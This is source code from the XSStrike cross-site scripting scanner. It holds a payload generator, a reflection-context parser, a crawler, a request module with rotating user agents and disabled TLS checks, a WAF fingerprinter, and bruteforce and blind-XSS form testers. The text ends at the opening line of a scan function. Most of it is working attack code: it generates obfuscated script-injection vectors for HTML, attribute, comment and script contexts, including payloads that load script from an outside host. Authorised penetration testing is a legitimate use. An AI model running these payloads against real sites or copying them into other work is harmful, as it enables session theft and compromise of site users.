from core.config import xsschecker, badTags, fillings, eFillings, lFillings, jFillings, eventHandlers, tags, functions
from core.jsContexter import jsContexter
from core.utils import randomUpper as r, genGen, extractScripts


def generator(occurences, response):
    scripts = extractScripts(response)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}
    for i in occurences:
        context = occurences[i]['context']
        if context == 'html':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            badTag = occurences[i]['details']['badTag'] if 'badTag' in occurences[i]['details'] else ''
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends, badTag)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'attribute':
            found = False
            tag = occurences[i]['details']['tag']
            Type = occurences[i]['details']['type']
            quote = occurences[i]['details']['quote'] or ''
            attributeName = occurences[i]['details']['name']
            attributeValue = occurences[i]['details']['value']
            quoteEfficiency = occurences[i]['score'][quote] if quote in occurences[i]['score'] else 100
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if greatBracketEfficiency == 100 and quoteEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    payload = quote + '>' + payload
                    found = True
                    vectors[9].add(payload)
            if quoteEfficiency == 100:
                for filling in fillings:
                    for function in functions:
                        vector = quote + filling + r('autofocus') + \
                            filling + r('onfocus') + '=' + quote + function
                        found = True
                        vectors[8].add(vector)
            if quoteEfficiency == 90:
                for filling in fillings:
                    for function in functions:
                        vector = '\\' + quote + filling + r('autofocus') + filling + \
                            r('onfocus') + '=' + function + filling + '\\' + quote
                        found = True
                        vectors[7].add(vector)
            if Type == 'value':
                if attributeName == 'srcdoc':
                    if occurences[i]['score']['&lt;']:
                        if occurences[i]['score']['&gt;']:
                            del ends[:]
                            ends.append('%26gt;')
                        payloads = genGen(
                            fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                        for payload in payloads:
                            found = True
                            vectors[9].add(payload.replace('<', '%26lt;'))
                elif attributeName == 'href' and attributeValue == xsschecker:
                    for function in functions:
                        found = True
                        vectors[10].add(r('javascript:') + function)
                elif attributeName.startswith('on'):
                    closer = jsContexter(attributeValue)
                    quote = ''
                    for char in attributeValue.split(xsschecker)[1]:
                        if char in ['\'', '"', '`']:
                            quote = char
                            break
                    suffix = '//\\'
                    for filling in jFillings:
                        for function in functions:
                            vector = quote + closer + filling + function + suffix
                            if found:
                                vectors[7].add(vector)
                            else:
                                vectors[9].add(vector)
                    if quoteEfficiency > 83:
                        suffix = '//'
                        for filling in jFillings:
                            for function in functions:
                                if '=' in function:
                                    function = '(' + function + ')'
                                if quote == '':
                                    filling = ''
                                vector = '\\' + quote + closer + filling + function + suffix
                                if found:
                                    vectors[7].add(vector)
                                else:
                                    vectors[9].add(vector)
                elif tag in ('script', 'iframe', 'embed', 'object'):
                    if attributeName in ('src', 'iframe', 'embed') and attributeValue == xsschecker:
                        payloads = ['//15.rs', '\\/\\\\\\/\\15.rs']
                        for payload in payloads:
                            vectors[10].add(payload)
                    elif tag == 'object' and attributeName == 'data' and attributeValue == xsschecker:
                        for function in functions:
                            found = True
                            vectors[10].add(r('javascript:') + function)
                    elif quoteEfficiency == greatBracketEfficiency == 100:
                        payloads = genGen(fillings, eFillings, lFillings,
                                          eventHandlers, tags, functions, ends)
                        for payload in payloads:
                            payload = quote + '>' + r('</script/>') + payload
                            found = True
                            vectors[11].add(payload)
        elif context == 'comment':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'script':
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            closer = jsContexter(script)
            quote = occurences[i]['details']['quote']
            scriptEfficiency = occurences[i]['score']['</scRipT/>']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = 100
            if quote:
                breakerEfficiency = occurences[i]['score'][quote]
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if scriptEfficiency == 100:
                breaker = r('</script/>')
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[10].add(payload)
            if closer:
                suffix = '//\\'
                for filling in jFillings:
                    for function in functions:
                        vector = quote + closer + filling + function + suffix
                        vectors[7].add(vector)
            elif breakerEfficiency > 83:
                prefix = ''
                suffix = '//'
                if breakerEfficiency != 100:
                    prefix = '\\'
                for filling in jFillings:
                    for function in functions:
                        if '=' in function:
                            function = '(' + function + ')'
                        if quote == '':
                            filling = ''
                        vector = prefix + quote + closer + filling + function + suffix
                        vectors[6].add(vector)
            index += 1
    return vectors


import re

from core.config import badTags, xsschecker
from core.utils import isBadContext, equalize, escaped, extractScripts


def htmlParser(response, encoding):
    rawResponse = response  # raw response returned by requests
    response = response.text  # response content
    if encoding:  # if the user has specified an encoding, encode the probe in that
        response = response.replace(encoding(xsschecker), xsschecker)
    reflections = response.count(xsschecker)
    position_and_context = {}
    environment_details = {}
    clean_response = re.sub(r'<!--[.\s\S]*?-->', '', response)
    script_checkable = clean_response
    for script in extractScripts(script_checkable):
        occurences = re.finditer(r'(%s.*?)$' % xsschecker, script)
        if occurences:
            for occurence in occurences:
                thisPosition = occurence.start(1)
                position_and_context[thisPosition] = 'script'
                environment_details[thisPosition] = {}
                environment_details[thisPosition]['details'] = {'quote' : ''}
                for i in range(len(occurence.group())):
                    currentChar = occurence.group()[i]
                    if currentChar in ('/', '\'', '`', '"') and not escaped(i, occurence.group()):
                        environment_details[thisPosition]['details']['quote'] = currentChar
                    elif currentChar in (')', ']', '}', '}') and not escaped(i, occurence.group()):
                        break
                script_checkable = script_checkable.replace(xsschecker, '', 1)
    if len(position_and_context) < reflections:
        attribute_context = re.finditer(r'<[^>]*?(%s)[^>]*?>' % xsschecker, clean_response)
        for occurence in attribute_context:
            match = occurence.group(0)
            thisPosition = occurence.start(1)
            parts = re.split(r'\s', match)
            tag = parts[0][1:]
            for part in parts:
                if xsschecker in part:
                    Type, quote, name, value = '', '', '', ''
                    if '=' in part:
                        quote = re.search(r'=([\'`"])?', part).group(1)
                        name_and_value = part.split('=')[0], '='.join(part.split('=')[1:])
                        if xsschecker == name_and_value[0]:
                            Type = 'name'
                        else:
                            Type = 'value'
                        name = name_and_value[0]
                        value = name_and_value[1].rstrip('>').rstrip(quote).lstrip(quote)
                    else:
                        Type = 'flag'
                    position_and_context[thisPosition] = 'attribute'
                    environment_details[thisPosition] = {}
                    environment_details[thisPosition]['details'] = {'tag' : tag, 'type' : Type, 'quote' : quote, 'value' : value, 'name' : name}
    if len(position_and_context) < reflections:
        html_context = re.finditer(xsschecker, clean_response)
        for occurence in html_context:
            thisPosition = occurence.start()
            if thisPosition not in position_and_context:
                position_and_context[occurence.start()] = 'html'
                environment_details[thisPosition] = {}
                environment_details[thisPosition]['details'] = {}
    if len(position_and_context) < reflections:
        comment_context = re.finditer(r'<!--[\s\S]*?(%s)[\s\S]*?-->' % xsschecker, response)
        for occurence in comment_context:
            thisPosition = occurence.start(1)
            position_and_context[thisPosition] = 'comment'
            environment_details[thisPosition] = {}
            environment_details[thisPosition]['details'] = {}
    database = {}
    for i in sorted(position_and_context):
        database[i] = {}
        database[i]['position'] = i
        database[i]['context'] = position_and_context[i]
        database[i]['details'] = environment_details[i]['details']

    bad_contexts = re.finditer(r'(?s)(?i)<(style|template|textarea|title|noembed|noscript)>[.\s\S]*(%s)[.\s\S]*</\1>' % xsschecker, response)
    non_executable_contexts = []
    for each in bad_contexts:
        non_executable_contexts.append([each.start(), each.end(), each.group(1)])

    if non_executable_contexts:
        for key in database.keys():
            position = database[key]['position']
            badTag = isBadContext(position, non_executable_contexts)
            if badTag:
                database[key]['details']['badTag'] = badTag
            else:
                database[key]['details']['badTag'] = ''
    return database

import logging
from .colors import *

__all__ = ['setup_logger', 'console_log_level', 'file_log_level', 'log_file']

console_log_level = 'INFO'
file_log_level = None
log_file = 'xsstrike.log'

"""
Default Logging Levels
CRITICAL = 50
ERROR = 40
WARNING = 30
INFO = 20
DEBUG = 10
"""

VULN_LEVEL_NUM = 60
RUN_LEVEL_NUM = 22
GOOD_LEVEL_NUM = 25


logging.addLevelName(VULN_LEVEL_NUM, 'VULN')
logging.addLevelName(RUN_LEVEL_NUM, 'RUN')
logging.addLevelName(GOOD_LEVEL_NUM, 'GOOD')


def _vuln(self, msg, *args, **kwargs):
    if self.isEnabledFor(VULN_LEVEL_NUM):
        self._log(VULN_LEVEL_NUM, msg, args, **kwargs)


def _run(self, msg, *args, **kwargs):
    if self.isEnabledFor(RUN_LEVEL_NUM):
        self._log(RUN_LEVEL_NUM, msg, args, **kwargs)


def _good(self, msg, *args, **kwargs):
    if self.isEnabledFor(GOOD_LEVEL_NUM):
        self._log(GOOD_LEVEL_NUM, msg, args, **kwargs)


logging.Logger.vuln = _vuln
logging.Logger.run = _run
logging.Logger.good = _good


log_config = {
    'DEBUG': {
        'value': logging.DEBUG,
        'prefix': '{}[*]{}'.format(yellow, end),
    },
    'INFO': {
        'value': logging.INFO,
        'prefix': info,
    },
    'RUN': {
        'value': RUN_LEVEL_NUM,
        'prefix': run,
    },
    'GOOD': {
        'value': GOOD_LEVEL_NUM,
        'prefix': good,
    },
    'WARNING': {
        'value': logging.WARNING,
        'prefix': '[!!]'.format(yellow, end),
    },
    'ERROR': {
        'value': logging.ERROR,
        'prefix': bad,
    },
    'CRITICAL': {
        'value': logging.CRITICAL,
        'prefix': '{}[--]{}'.format(red, end),
    },
    'VULN': {
        'value': VULN_LEVEL_NUM,
        'prefix': '{}[++]{}'.format(green, red),
    }
}


class CustomFormatter(logging.Formatter):
    def format(self, record):
        msg = super().format(record)
        if record.levelname in log_config.keys():
            msg = '%s %s %s' % (log_config[record.levelname]['prefix'], msg, end)
        return msg


class CustomStreamHandler(logging.StreamHandler):
    default_terminator = '\n'

    def emit(self, record):
        """
        Overrides emit method to temporally update terminator character in case last log record character is '\r'
        :param record:
        :return:
        """
        if record.msg.endswith('\r'):
            self.terminator = '\r'
            super().emit(record)
            self.terminator = self.default_terminator
        else:
            super().emit(record)


def _switch_to_no_format_loggers(self):
    self.removeHandler(self.console_handler)
    self.addHandler(self.no_format_console_handler)
    if hasattr(self, 'file_handler') and hasattr(self, 'no_format_file_handler'):
        self.removeHandler(self.file_handler)
        self.addHandler(self.no_format_file_handler)


def _switch_to_default_loggers(self):
    self.removeHandler(self.no_format_console_handler)
    self.addHandler(self.console_handler)
    if hasattr(self, 'file_handler') and hasattr(self, 'no_format_file_handler'):
        self.removeHandler(self.no_format_file_handler)
        self.addHandler(self.file_handler)


def _get_level_and_log(self, msg, level):
    if level.upper() in log_config.keys():
        log_method = getattr(self, level.lower())
        log_method(msg)
    else:
        self.info(msg)


def log_red_line(self, amount=60, level='INFO'):
    _switch_to_no_format_loggers(self)
    _get_level_and_log(self, red + ('-' * amount) + end, level)
    _switch_to_default_loggers(self)


def log_no_format(self, msg='', level='INFO'):
    _switch_to_no_format_loggers(self)
    _get_level_and_log(self, msg, level)
    _switch_to_default_loggers(self)


def log_debug_json(self, msg='', data={}):
    if self.isEnabledFor(logging.DEBUG):
        if isinstance(data, dict):
            import json
            try:
                self.debug('{} {}'.format(msg, json.dumps(data, indent=2)))
            except TypeError:
                self.debug('{} {}'.format(msg, data))
        else:
            self.debug('{} {}'.format(msg, data))


def setup_logger(name='xsstrike'):
    from types import MethodType
    logger = logging.getLogger(name)
    logger.setLevel(logging.DEBUG)
    console_handler = CustomStreamHandler(sys.stdout)
    console_handler.setLevel(log_config[console_log_level]['value'])
    console_handler.setFormatter(CustomFormatter('%(message)s'))
    logger.addHandler(console_handler)
    # Setup blank handler to temporally use to log without format
    no_format_console_handler = CustomStreamHandler(sys.stdout)
    no_format_console_handler.setLevel((log_config[console_log_level]['value']))
    no_format_console_handler.setFormatter(logging.Formatter(fmt=''))
    # Store current handlers
    logger.console_handler = console_handler
    logger.no_format_console_handler = no_format_console_handler

    if file_log_level:
        detailed_formatter = logging.Formatter('%(asctime)s %(name)s - %(levelname)s - %(message)s')
        file_handler = logging.FileHandler(log_file)
        file_handler.setLevel(log_config[file_log_level]['value'])
        file_handler.setFormatter(detailed_formatter)
        logger.addHandler(file_handler)
        # Setup blank handler to temporally use to log without format
        no_format_file_handler = logging.FileHandler(log_file)
        no_format_file_handler.setLevel(log_config[file_log_level]['value'])
        no_format_file_handler.setFormatter(logging.Formatter(fmt=''))
        # Store file handlers
        logger.file_handler = file_handler
        logger.no_format_file_handler = no_format_file_handler

    # Create logger method to only log a red line
    logger.red_line = MethodType(log_red_line, logger)
    # Create logger method to log without format
    logger.no_format = MethodType(log_no_format, logger)
    # Create logger method to convert data to json and log with debug level
    logger.debug_json = MethodType(log_debug_json, logger)
    return logger


import re
import concurrent.futures
from urllib.parse import urlparse

from core.dom import dom
from core.log import setup_logger
from core.utils import getUrl, getParams
from core.requester import requester
from core.zetanize import zetanize
from plugins.retireJs import retireJs

logger = setup_logger(__name__)


def photon(seedUrl, headers, level, threadCount, delay, timeout, skipDOM):
    forms = []  # web forms
    processed = set()  # urls that have been crawled
    storage = set()  # urls that belong to the target i.e. in-scope
    schema = urlparse(seedUrl).scheme  # extract the scheme e.g. http or https
    host = urlparse(seedUrl).netloc  # extract the host e.g. example.com
    main_url = schema + '://' + host  # join scheme and host to make the root url
    storage.add(seedUrl)  # add the url to storage
    checkedDOMs = []

    def rec(target):
        processed.add(target)
        printableTarget = '/'.join(target.split('/')[3:])
        if len(printableTarget) > 40:
            printableTarget = printableTarget[-40:]
        else:
            printableTarget = (printableTarget + (' ' * (40 - len(printableTarget))))
        logger.run('Parsing %s\r' % printableTarget)
        url = getUrl(target, True)
        params = getParams(target, '', True)
        if '=' in target:  # if there's a = in the url, there should be GET parameters
            inps = []
            for name, value in params.items():
                inps.append({'name': name, 'value': value})
            forms.append({0: {'action': url, 'method': 'get', 'inputs': inps}})
        response = requester(url, params, headers, True, delay, timeout).text
        retireJs(url, response)
        if not skipDOM:
            highlighted = dom(response)
            clean_highlighted = ''.join([re.sub(r'^\d+\s+', '', line) for line in highlighted])
            if highlighted and clean_highlighted not in checkedDOMs:
                checkedDOMs.append(clean_highlighted)
                logger.good('Potentially vulnerable objects found at %s' % url)
                logger.red_line(level='good')
                for line in highlighted:
                    logger.no_format(line, level='good')
                logger.red_line(level='good')
        forms.append(zetanize(response))
        matches = re.findall(r'<[aA].*href=["\']{0,1}(.*?)["\']', response)
        for link in matches:  # iterate over the matches
            # remove everything after a "#" to deal with in-page anchors
            link = link.split('#')[0]
            if link.endswith(('.pdf', '.png', '.jpg', '.jpeg', '.xls', '.xml', '.docx', '.doc')):
                pass
            else:
                if link[:4] == 'http':
                    if link.startswith(main_url):
                        storage.add(link)
                elif link[:2] == '//':
                    if link.split('/')[2].startswith(host):
                        storage.add(schema + link)
                elif link[:1] == '/':
                    storage.add(main_url + link)
                else:
                    storage.add(main_url + '/' + link)
    try:
        for x in range(level):
            urls = storage - processed  # urls to crawl = all urls - urls that have been crawled
            # for url in urls:
            #     rec(url)
            threadpool = concurrent.futures.ThreadPoolExecutor(
                max_workers=threadCount)
            futures = (threadpool.submit(rec, url) for url in urls)
            for i in concurrent.futures.as_completed(futures):
                pass
    except KeyboardInterrupt:
        return [forms, processed]
    return [forms, processed]


import os
import tempfile

from core.config import defaultEditor
from core.colors import white, yellow
from core.log import setup_logger

logger = setup_logger(__name__)


def prompt(default=None):
    # try assigning default editor, if fails, use default
    editor = os.environ.get('EDITOR', defaultEditor)
    # create a temporary file and open it
    with tempfile.NamedTemporaryFile(mode='r+') as tmpfile:
        if default:  # if prompt should have some predefined text
            tmpfile.write(default)
            tmpfile.flush()
        child_pid = os.fork()
        is_child = child_pid == 0
        if is_child:
            # opens the file in the editor
            try:
                os.execvp(editor, [editor, tmpfile.name])
            except FileNotFoundError:
                logger.error('You don\'t have either a default $EDITOR \
value defined nor \'nano\' text editor')
                logger.info('Execute %s`export EDITOR=/pat/to/your/editor` \
%sthen run XSStrike again.\n\n' % (yellow,white))
                exit(1)
        else:
            os.waitpid(child_pid, 0)  # wait till the editor gets closed
            tmpfile.seek(0)
            return tmpfile.read().strip()  # read the file


import random
import requests
import time
from urllib3.exceptions import ProtocolError
import warnings

import core.config
from core.utils import converter, getVar
from core.log import setup_logger

logger = setup_logger(__name__)

warnings.filterwarnings('ignore')  # Disable SSL related warnings


def requester(url, data, headers, GET, delay, timeout):
    if getVar('jsonData'):
        data = converter(data)
    elif getVar('path'):
        url = converter(data, url)
        data = []
        GET, POST = True, False
    time.sleep(delay)
    user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0',
                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
                   'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991']
    if 'User-Agent' not in headers:
        headers['User-Agent'] = random.choice(user_agents)
    elif headers['User-Agent'] == '$':
        headers['User-Agent'] = random.choice(user_agents)
    logger.debug('Requester url: {}'.format(url))
    logger.debug('Requester GET: {}'.format(GET))
    logger.debug_json('Requester data:', data)
    logger.debug_json('Requester headers:', headers)
    try:
        if GET:
            response = requests.get(url, params=data, headers=headers,
                                    timeout=timeout, verify=False, proxies=core.config.proxies)
        elif getVar('jsonData'):
            response = requests.post(url, json=data, headers=headers,
                                    timeout=timeout, verify=False, proxies=core.config.proxies)
        else:
            response = requests.post(url, data=data, headers=headers,
                                     timeout=timeout, verify=False, proxies=core.config.proxies)
        return response
    except ProtocolError:
        logger.warning('WAF is dropping suspicious requests.')
        logger.warning('Scanning will continue after 10 minutes.')
        time.sleep(600)
    except Exception as e:
        logger.warning('Unable to connect to the target.')
        return requests.Response()


import json
import random
import re
from urllib.parse import urlparse

import core.config
from core.config import xsschecker


def converter(data, url=False):
    if 'str' in str(type(data)):
        if url:
            dictized = {}
            parts = data.split('/')[3:]
            for part in parts:
                dictized[part] = part
            return dictized
        else:
            return json.loads(data)
    else:
        if url:
            url = urlparse(url).scheme + '://' + urlparse(url).netloc
            for part in list(data.values()):
                url += '/' + part
            return url
        else:
            return json.dumps(data)


def counter(string):
    string = re.sub(r'\s|\w', '', string)
    return len(string)


def closest(number, numbers):
    difference = [abs(list(numbers.values())[0]), {}]
    for index, i in numbers.items():
        diff = abs(number - i)
        if diff < difference[0]:
            difference = [diff, {index: i}]
    return difference[1]


def fillHoles(original, new):
    filler = 0
    filled = []
    for x, y in zip(original, new):
        if int(x) == (y + filler):
            filled.append(y)
        else:
            filled.extend([0, y])
            filler += (int(x) - y)
    return filled


def stripper(string, substring, direction='right'):
    done = False
    strippedString = ''
    if direction == 'right':
        string = string[::-1]
    for char in string:
        if char == substring and not done:
            done = True
        else:
            strippedString += char
    if direction == 'right':
        strippedString = strippedString[::-1]
    return strippedString


def extractHeaders(headers):
    headers = headers.replace('\\n', '\n')
    sorted_headers = {}
    matches = re.findall(r'(.*):\s(.*)', headers)
    for match in matches:
        header = match[0]
        value = match[1]
        try:
            if value[-1] == ',':
                value = value[:-1]
            sorted_headers[header] = value
        except IndexError:
            pass
    return sorted_headers


def replaceValue(mapping, old, new, strategy=None):
    """
    Replace old values with new ones following dict strategy.

    The parameter strategy is None per default for inplace operation.
    A copy operation is injected via strateg values like copy.copy
    or copy.deepcopy

    Note: A dict is returned regardless of modifications.
    """
    anotherMap = strategy(mapping) if strategy else mapping
    if old in anotherMap.values():
        for k in anotherMap.keys():
            if anotherMap[k] == old:
                anotherMap[k] = new
    return anotherMap


def getUrl(url, GET):
    if GET:
        return url.split('?')[0]
    else:
        return url


def extractScripts(response):
    scripts = []
    matches = re.findall(r'(?s)<script.*?>(.*?)</script>', response.lower())
    for match in matches:
        if xsschecker in match:
            scripts.append(match)
    return scripts


def randomUpper(string):
    return ''.join(random.choice((x, y)) for x, y in zip(string.upper(), string.lower()))


def flattenParams(currentParam, params, payload):
    flatted = []
    for name, value in params.items():
        if name == currentParam:
            value = payload
        flatted.append(name + '=' + value)
    return '?' + '&'.join(flatted)


def genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag=None):
    vectors = []
    r = randomUpper  # randomUpper randomly converts chars of a string to uppercase
    for tag in tags:
        if tag == 'd3v' or tag == 'a':
            bait = xsschecker
        else:
            bait = ''
        for eventHandler in eventHandlers:
            # if the tag is compatible with the event handler
            if tag in eventHandlers[eventHandler]:
                for function in functions:
                    for filling in fillings:
                        for eFilling in eFillings:
                            for lFilling in lFillings:
                                for end in ends:
                                    if tag == 'd3v' or tag == 'a':
                                        if '>' in ends:
                                            end = '>'  # we can't use // as > with "a" or "d3v" tag
                                    breaker = ''
                                    if badTag:
                                        breaker = '</' + r(badTag) + '>'
                                    vector = breaker + '<' + r(tag) + filling + r(
                                        eventHandler) + eFilling + '=' + eFilling + function + lFilling + end + bait
                                    vectors.append(vector)
    return vectors


def getParams(url, data, GET):
    params = {}
    if '?' in url and '=' in url:
        data = url.split('?')[1]
        if data[:1] == '?':
            data = data[1:]
    elif data:
        if getVar('jsonData') or getVar('path'):
            params = data
        else:
            try:
                params = json.loads(data.replace('\'', '"'))
                return params
            except json.decoder.JSONDecodeError:
                pass
    else:
        return None
    if not params:
        parts = data.split('&')
        for part in parts:
            each = part.split('=')
            if len(each) < 2:
                each.append('')
            try:
                params[each[0]] = each[1]
            except IndexError:
                params = None
    return params


def writer(obj, path):
    kind = str(type(obj)).split('\'')[0]
    if kind == 'list' or kind == 'tuple':
        obj = '\n'.join(obj)
    elif kind == 'dict':
        obj = json.dumps(obj, indent=4)
    savefile = open(path, 'w+')
    savefile.write(str(obj.encode('utf-8')))
    savefile.close()


def reader(path):
    with open(path, 'r') as f:
        result = [line.rstrip(
                    '\n').encode('utf-8').decode('utf-8') for line in f]
    return result

def js_extractor(response):
    """Extract js files from the response body"""
    scripts = []
    matches = re.findall(r'<(?:script|SCRIPT).*?(?:src|SRC)=([^\s>]+)', response)
    for match in matches:
        match = match.replace('\'', '').replace('"', '').replace('`', '')
        scripts.append(match)
    return scripts


def handle_anchor(parent_url, url):
    scheme = urlparse(parent_url).scheme
    if url[:4] == 'http':
        return url
    elif url[:2] == '//':
        return scheme + ':' + url
    elif url.startswith('/'):
        host = urlparse(parent_url).netloc
        scheme = urlparse(parent_url).scheme
        parent_url = scheme + '://' + host
        return parent_url + url
    elif parent_url.endswith('/'):
        return parent_url + url
    else:
        return parent_url + '/' + url


def deJSON(data):
    return data.replace('\\\\', '\\')


def getVar(name):
    return core.config.globalVariables[name]

def updateVar(name, data, mode=None):
    if mode:
        if mode == 'append':
            core.config.globalVariables[name].append(data)
        elif mode == 'add':
            core.config.globalVariables[name].add(data)
    else:
        core.config.globalVariables[name] = data

def isBadContext(position, non_executable_contexts):
    badContext = ''
    for each in non_executable_contexts:
        if each[0] < position < each[1]:
            badContext = each[2]
            break
    return badContext

def equalize(array, number):
    if len(array) < number:
        array.append('')

def escaped(position, string):
    usable = string[:position][::-1]
    match = re.search(r'^\\*', usable)
    if match:
        match = match.group()
        if len(match) == 1:
            return True
        elif len(match) % 2 == 0:
            return False
        else:
            return True
    else:
        return False


import json
import re
import sys

from core.requester import requester
from core.log import setup_logger

logger = setup_logger(__name__)


def wafDetector(url, params, headers, GET, delay, timeout):
    with open(sys.path[0] + '/db/wafSignatures.json', 'r') as file:
        wafSignatures = json.load(file)
    # a payload which is noisy enough to provoke the WAF
    noise = '<script>alert("XSS")</script>'
    params['xss'] = noise
    # Opens the noise injected payload
    response = requester(url, params, headers, GET, delay, timeout)
    page = response.text
    code = str(response.status_code)
    headers = str(response.headers)
    logger.debug('Waf Detector code: {}'.format(code))
    logger.debug_json('Waf Detector headers:', response.headers)

    if int(code) >= 400:
        bestMatch = [0, None]
        for wafName, wafSignature in wafSignatures.items():
            score = 0
            pageSign = wafSignature['page']
            codeSign = wafSignature['code']
            headersSign = wafSignature['headers']
            if pageSign:
                if re.search(pageSign, page, re.I):
                    score += 1
            if codeSign:
                if re.search(codeSign, code, re.I):
                    score += 0.5  # increase the overall score by a smaller amount because http codes aren't strong indicators
            if headersSign:
                if re.search(headersSign, headers, re.I):
                    score += 1
            # if the overall score of the waf is higher than the previous one
            if score > bestMatch[0]:
                del bestMatch[:]  # delete the previous one
                bestMatch.extend([score, wafName])  # and add this one
        if bestMatch[0] != 0:
            return bestMatch[1]
        else:
            return None
    else:
        return None


import re


def zetanize(response):
    def e(string):
        return string.encode('utf-8')

    def d(string):
        return string.decode('utf-8')

    # remove the content between html comments
    response = re.sub(r'(?s)<!--.*?-->', '', response)
    forms = {}
    matches = re.findall(r'(?i)(?s)<form.*?</form.*?>',
                         response)  # extract all the forms
    num = 0
    for match in matches:  # everything else is self explanatory if you know regex
        page = re.search(r'(?i)action=[\'"](.*?)[\'"]', match)
        method = re.search(r'(?i)method=[\'"](.*?)[\'"]', match)
        forms[num] = {}
        forms[num]['action'] = d(e(page.group(1))) if page else ''
        forms[num]['method'] = d(
            e(method.group(1)).lower()) if method else 'get'
        forms[num]['inputs'] = []
        inputs = re.findall(r'(?i)(?s)<input.*?>', response)
        for inp in inputs:
            inpName = re.search(r'(?i)name=[\'"](.*?)[\'"]', inp)
            if inpName:
                inpType = re.search(r'(?i)type=[\'"](.*?)[\'"]', inp)
                inpValue = re.search(r'(?i)value=[\'"](.*?)[\'"]', inp)
                inpName = d(e(inpName.group(1)))
                inpType = d(e(inpType.group(1)))if inpType else ''
                inpValue = d(e(inpValue.group(1))) if inpValue else ''
                if inpType.lower() == 'submit' and inpValue == '':
                    inpValue = 'Submit Query'
                inpDict = {
                    'name': inpName,
                    'type': inpType,
                    'value': inpValue
                }
                forms[num]['inputs'].append(inpDict)
        num += 1
    return forms


import copy
from urllib.parse import urlparse, unquote

from core.colors import good, green, end
from core.requester import requester
from core.utils import getUrl, getParams
from core.log import setup_logger

logger = setup_logger(__name__)


def bruteforcer(target, paramData, payloadList, encoding, headers, delay, timeout):
    GET, POST = (False, True) if paramData else (True, False)
    host = urlparse(target).netloc  # Extracts host out of the url
    logger.debug('Parsed host to bruteforce: {}'.format(host))
    url = getUrl(target, GET)
    logger.debug('Parsed url to bruteforce: {}'.format(url))
    params = getParams(target, paramData, GET)
    logger.debug_json('Bruteforcer params:', params)
    if not params:
        logger.error('No parameters to test.')
        quit()
    for paramName in params.keys():
        progress = 1
        paramsCopy = copy.deepcopy(params)
        for payload in payloadList:
            logger.run('Bruteforcing %s[%s%s%s]%s: %i/%i\r' %
                       (green, end, paramName, green, end, progress, len(payloadList)))
            if encoding:
                payload = encoding(unquote(payload))
            paramsCopy[paramName] = payload
            response = requester(url, paramsCopy, headers,
                                 GET, delay, timeout).text
            if encoding:
                payload = encoding(payload)
            if payload in response:
                logger.info('%s %s' % (good, payload))
            progress += 1
    logger.no_format('')


import copy
import re

import core.config
from core.colors import green, end
from core.config import xsschecker
from core.filterChecker import filterChecker
from core.generator import generator
from core.htmlParser import htmlParser
from core.requester import requester
from core.log import setup_logger

logger = setup_logger(__name__)


def crawl(scheme, host, main_url, form, blindXSS, blindPayload, headers, delay, timeout, encoding):
    if form:
        for each in form.values():
            url = each['action']
            if url:
                if url.startswith(main_url):
                    pass
                elif url.startswith('//') and url[2:].startswith(host):
                    url = scheme + '://' + url[2:]
                elif url.startswith('/'):
                    url = scheme + '://' + host + url
                elif re.match(r'\w', url[0]):
                    url = scheme + '://' + host + '/' + url
                if url not in core.config.globalVariables['checkedForms']:
                    core.config.globalVariables['checkedForms'][url] = []
                method = each['method']
                GET = True if method == 'get' else False
                inputs = each['inputs']
                paramData = {}
                for one in inputs:
                    paramData[one['name']] = one['value']
                    for paramName in paramData.keys():
                        if paramName not in core.config.globalVariables['checkedForms'][url]:
                            core.config.globalVariables['checkedForms'][url].append(paramName)
                            paramsCopy = copy.deepcopy(paramData)
                            paramsCopy[paramName] = xsschecker
                            response = requester(
                                url, paramsCopy, headers, GET, delay, timeout)
                            occurences = htmlParser(response, encoding)
                            positions = occurences.keys()
                            occurences = filterChecker(
                                url, paramsCopy, headers, GET, delay, occurences, timeout, encoding)
                            vectors = generator(occurences, response.text)
                            if vectors:
                                for confidence, vects in vectors.items():
                                    try:
                                        payload = list(vects)[0]
                                        logger.vuln('Vulnerable webpage: %s%s%s' %
                                                    (green, url, end))
                                        logger.vuln('Vector for %s%s%s: %s' %
                                                    (green, paramName, end, payload))
                                        break
                                    except IndexError:
                                        pass
                            if blindXSS and blindPayload:
                                paramsCopy[paramName] = blindPayload
                                requester(url, paramsCopy, headers,
                                          GET, delay, timeout)



import copy
import re
from urllib.parse import urlparse, quote, unquote

from core.checker import checker
from core.colors import end, green, que
import core.config
from core.config import xsschecker, minEfficiency
from core.dom import dom
from core.filterChecker import filterChecker
from core.generator import generator
from core.htmlParser import htmlParser
from core.requester import requester
from core.utils import getUrl, getParams, getVar
from core.wafDetector import wafDetector
from core.log import setup_logger

logger = setup_logger(__name__)


def scan(target, paramData, encoding, headers, delay, timeout, skipDOM, skip):
